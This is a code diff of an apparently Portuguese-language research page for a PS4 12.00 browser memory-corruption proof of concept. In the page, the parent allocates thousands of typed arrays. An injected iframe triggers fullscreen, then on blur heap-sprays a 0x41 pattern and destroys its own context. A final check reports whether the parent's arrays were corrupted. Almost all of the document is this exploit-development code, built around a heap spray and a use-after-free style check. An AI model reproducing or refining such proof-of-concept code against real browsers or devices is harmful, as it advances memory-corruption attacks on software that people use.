@@ -2,89 +2,106 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Iframe Isolation - Leandro</title>
+    <title>PS4 Persistence Test - Leandro</title>
 </head>
-<body>
+<body style="background-color: #f0f0f0; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - Isolated Iframe Test</h1>
-    <p>Objetivo: Rodar o Crash PoC original dentro de um frame para manter a aba pai viva.</p>
+    <h1>PS4 12.00 - Persistence Research</h1>
+    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando Preparação...</span></p>
 
-    <button onclick="setupAndRun()">1. Setup & Run (Iframe Context)</button>
+    <button onclick="prepareObjects()" style="padding: 10px;">1. Preparar Objetos (Pai)</button>
     
-    <div id="frame-container" style="margin-top: 20px;">
+    <button onclick="setupIframe()" style="padding: 10px;">2. Injetar Iframe de Gatilho</button>
+
+    <button onclick="checkPersistence()" style="padding: 10px; background-color: #d1ffd1;">3. Verificar Persistência</button>
+
+    <hr>
+    <div id="frame-container">
         </div>
 
     <script>
-    function setupAndRun() {
-        const container = document.getElementById('frame-container');
-        
-        // Criando o Iframe
-        container.innerHTML = '<iframe id="pocFrame" style="width:500px; height:300px; border:1px solid #000;"></iframe>';
-        
-        const frame = document.getElementById('pocFrame');
-        const fDoc = frame.contentWindow.document;
+        const PATTERN = 2.121995791e-314; // 0x4141414141414141
+        let controllers = [];
+        const statusPai = document.getElementById('status-pai');
 
-        // Injetando EXATAMENTE o seu código de sucesso no frame
-        fDoc.open();
-        fDoc.write(`
-            <!DOCTYPE html>
-            <html>
-            <body>
-                <h3>Iframe Content Active</h3>
-                <p id="status">Preparing Objects...</p>
-                <script>
-                    const PATTERN = 2.121995791e-314;
-                    let controllers = [];
+        // PASSO 1: Criar os objetos na página principal
+        function prepareObjects() {
+            controllers = [];
+            for(let i = 0; i < 5000; i++) {
+                let arr = new Float64Array(8);
+                arr[0] = i; // ID único para cada array
+                controllers.push(arr);
+            }
+            statusPai.innerText = "5000 Objetos prontos na RAM. Injete o Iframe.";
+            statusPai.style.color = "blue";
+        }
 
-                    // Passo 1: Criar objetos (Identico ao seu)
-                    for(let i = 0; i < 5000; i++) {
-                        let arr = new Float64Array(8);
-                        arr[0] = i;
-                        controllers.push(arr);
-                    }
-                    document.getElementById('status').innerText = "Objects Ready. Enter Fullscreen.";
+        // PASSO 2: Configurar o Iframe com o código de sucesso
+        function setupIframe() {
+            const container = document.getElementById('frame-container');
+            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:200px; border:2px dashed red;"></iframe>';
+            
+            const frame = document.getElementById('pocFrame');
+            const fDoc = frame.contentWindow.document;
 
-                    // Função para disparar dentro do frame
-                    window.startPoC = function() {
-                        const elem = document.documentElement;
-                        if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-                        
-                        window.onblur = function() {
-                            // Passo 2: Spray
-                            let spray = [];
-                            for(let i = 0; i < 8000; i++) {
-                                let p = new Float64Array(10);
-                                p.fill(PATTERN);
-                                spray.push(p);
-                            }
-
-                            // Passo 3: Verificação
-                            let corrupted = null;
-                            for(let i = 0; i < controllers.length; i++) {
-                                if (controllers[i][0] === PATTERN) {
-                                    corrupted = controllers[i];
-                                    break;
+            fDoc.open();
+            fDoc.write(`
+                <!DOCTYPE html>
+                <html>
+                <body style="background: #fff;">
+                    <h4>Contexto do Iframe (Gatilho)</h4>
+                    <button id="btnFS" onclick="startPoC()" style="padding:10px;">INICIAR FULLSCREEN NO FRAME</button>
+                    
+                    <script>
+                        window.startPoC = function() {
+                            const elem = document.documentElement;
+                            if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+                            
+                            // Gatilho no Blur (Options)
+                            window.onblur = function() {
+                                // Realiza o Spray de corrupção
+                                let spray = [];
+                                for(let i = 0; i < 8000; i++) {
+                                    let p = new Float64Array(10);
+                                    p.fill(${PATTERN});
+                                    spray.push(p);
                                 }
-                            }
 
-                            if (corrupted) {
-                                // PASSO FINAL: O document.write dentro do frame
+                                // TEARDOWN: Destrói apenas o contexto do Frame
                                 setTimeout(() => {
                                     document.open();
-                                    document.write('<html><body><h1>Frame Crashed</h1></body></html>');
+                                    document.write('<h1>FRAME FINALIZADO</h1>');
                                     document.close();
                                 }, 1000);
-                            }
+                            };
                         };
-                    };
-                <\/script>
-                <button onclick="startPoC()">2. Start Fullscreen (Inside Frame)</button>
-            </body>
-            </html>
-        `);
-        fDoc.close();
-    }
-    </script>
+                    <\/script>
+                </body>
+                </html>
+            `);
+            fDoc.close();
+            statusPai.innerText = "Iframe pronto. Entre em Fullscreen pelo frame e aperte OPTIONS.";
+        }
 
+        // PASSO 3: Verificar se os arrays do Pai foram afetados pelo spray do Iframe
+        function checkPersistence() {
+            let found = false;
+            let corruptedIndex = -1;
+
+            for(let i = 0; i < controllers.length; i++) {
+                if (controllers[i][0] === PATTERN) {
+                    found = true;
+                    corruptedIndex = i;
+                    break;
+                }
+            }
+
+            if (found) {
+                statusPai.innerHTML = "<span style='color:green; font-size: 20px;'>✓ SUCESSO: Memória Corrompida (ID: " + corruptedIndex + ")! O bug sobreviveu ao fechamento do frame!</span>";
+            } else {
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: A memória não foi afetada ou foi limpa.</span>";
+            }
+        }
+    </script>
 </body>
 </html>
